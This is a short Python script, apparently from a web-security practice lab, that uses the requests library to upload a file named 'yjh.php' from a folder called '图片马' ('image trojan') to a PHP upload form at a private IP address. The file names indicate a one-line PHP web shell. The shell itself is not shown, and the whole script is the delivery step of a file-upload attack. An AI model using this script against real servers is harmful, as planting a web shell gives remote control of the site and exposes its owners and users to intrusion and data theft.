import requests

urldef = "http://10.0.2.15/PHP/up/file1.php"

upFile = {"userNameFile":open("C:/Users/QQQ/Desktop/图片马/yjh.php","rb")}

postData = {"userSubmit":"上传"}

res = requests.post(url=urldef, files=upFile,data=postData)

print (res.text)
